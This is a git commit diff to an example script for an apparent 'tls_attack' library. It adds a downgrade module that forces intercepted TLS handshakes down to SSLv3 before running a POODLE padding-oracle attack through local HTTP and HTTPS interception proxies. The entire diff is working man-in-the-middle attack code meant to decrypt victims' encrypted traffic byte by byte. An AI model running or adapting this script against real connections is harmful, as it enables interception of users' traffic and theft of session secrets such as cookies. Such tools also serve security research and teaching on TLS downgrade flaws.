80722cf8fe590b8fa4ba34dc17be9ca93d9c5def
Olivier Arteau <arteau.olivier@gmail.com>
2015-08-22 19:24:11 -0400

    Added the downgrade module.

--- example-poodle.py
+++ example-poodle.py
@@ -7,6 +7,8 @@ from tls_attack.proxy.HTTPProxyServer          import *
 from tls_attack.module.ForceRequest            import *
 from tls_attack.module.ForceRequestOracle      import *
 from tls_attack.module.PoodleAttack            import *
+from tls_attack.module.AlterHandshake          import *
+from tls_attack.structure.TLSHeader            import *
 
 c_index = 0
 c_key = None
@@ -23,7 +25,7 @@ def poodle_result(guess, byte_index):
 
 def poodle_next():
     global c_index, c_key
-    attack.decrypt_byte(c_key, c_index, poodle_result)
+    poodle_attack.decrypt_byte(c_key, c_index, poodle_result)
 
 def poodle_handler(key, client_ip, server_ip):
     global c_key
@@ -38,6 +40,10 @@ http_server = HTTPProxyServer(port = 8080)
 force_request = ForceRequest(http_server)
 https_server = HTTPSProxyServer(port = 8443)
 
-attack = PoodleAttack(https_server, force_request)
-attack.on_vulnerable_connection(poodle_handler)
-attack.start()
+downgrade_attack = AlterHandshake(https_server)
+downgrade_attack.downgrade_tls_version(TLSVersion.SSLv3.value)
+downgrade_attack.start()
+
+poodle_attack = PoodleAttack(https_server, force_request)
+poodle_attack.on_vulnerable_connection(poodle_handler)
+poodle_attack.start()
